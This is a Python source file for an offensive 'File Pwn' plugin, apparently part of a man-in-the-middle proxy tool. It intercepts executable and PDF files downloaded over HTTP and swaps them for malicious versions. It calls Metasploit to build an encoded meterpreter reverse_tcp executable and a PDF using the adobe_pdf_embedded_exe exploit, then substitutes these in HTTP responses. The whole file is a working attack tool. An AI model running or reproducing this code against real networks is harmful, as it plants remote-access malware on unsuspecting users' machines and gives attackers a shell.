import os,subprocess,logging,time
from plugins.plugin import Plugin

exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class FilePwn(Plugin):
    name = "File Pwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    desc = "Replace files being downloaded via HTTP with malicious versions."
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.payloads = {}
        self._make_files()

    def _make_files(self):
        self.exe_made = False
        if self.options.exe:
            self._make_exe()
        if self.options.pdf:
            self._make_pdf()

    def _make_exe(self):
        if self.options.exe_file == None:
            logging.info("Generating our executable...")
            msfp = os.path.join(self.options.msf_path,"msfpayload") + " %s %s"
            msfe = os.path.join(self.options.msf_path,"msfencode") + " %s"
            payload = msfp%(self.options.msf_payload,self.options.msf_payload_opts)
            encode = msfe % "-t exe -o /tmp/tmp.exe -e x86/shikata_ga_nai -c 8"
            print payload+" R |"+encode
            os.system(payload+" R |"+encode)
            self.exe_made = True
            self.exe = "/tmp/tmp.exe"
        else:
            self.exe = self.options.exe_file
        self.exe_payload = open(self.exe,"rb").read()
        if self.options.exe:
            for m in exe_mimetypes:
                self.payloads[m] = self.exe_payload

    def _make_pdf(self):
        logging.info("Generating our PDF...")
        if self.options.pdf_exploit.find("embedded_exe") != -1:
            if not self.exe_made:
                self._make_exe()
            if self.options.msf_payload_opts.find("EXEFILE") == -1:
                self.options.msf_payload_opts += " EXEFILE=" + self.exe
        if self.options.msf_payload_opts.find("INFILENAME") == -1:
            self.options.msf_payload_opts += " INFILENAME=" + "data/blank.pdf"
        self.options.msf_payload_opts += " FILENAME=/tmp/tmp.pdf"
        msfc = os.path.join(self.options.msf_path,"msfcli") + " %s %s E"
        os.system(msfc % (self.options.pdf_exploit,self.options.msf_payload_opts))
        self.payloads['application/pdf'] = open("/tmp/tmp.pdf","rb").read()
    
    def handleResponse(self,request,data):
        print "http://" + request.client.getRequestHostname() + request.uri
        ch = request.client.headers['Content-Type']
        print ch
        if ch in self.payloads:
            data = self.payloads[ch]
            return {'request':request,'data':data}
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-path",type=str,default="/pentest/exploits/framework3/",
                help="Path to msf (default: /pentest/exploits/framework3)")
        options.add_argument("--msf-payload",type=str,default="windows/meterpreter/reverse_tcp",
                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
        options.add_argument("--msf-payload-opts",type=str,default="LHOST=127.0.0.1 LPORT=4444",
                help="Options for payload (default: \"LHOST=127.0.0.1 LPORT=4444\")")
        options.add_argument("--pdf",action="store_true",
                help="Intercept PDFs and replace with malicious.")
        options.add_argument("--exe",action="store_true",
                help="Intercept exe files and replace with malicious.")
        options.add_argument("--exe-file",type=str,
                help="Specify your own exe payload rather than generating with msf")
        #options.add_argument("--backdoor",action="store_true",
        #        help="Backdoor files rather than replace (SLOW)")
        options.add_argument("--pdf-exploit",type=str,
                default="exploit/windows/fileformat/adobe_pdf_embedded_exe",
                help="Exploit to use in PDF (default: exploit/windows/fileformat/adobe_pdf_embedded_exe)")
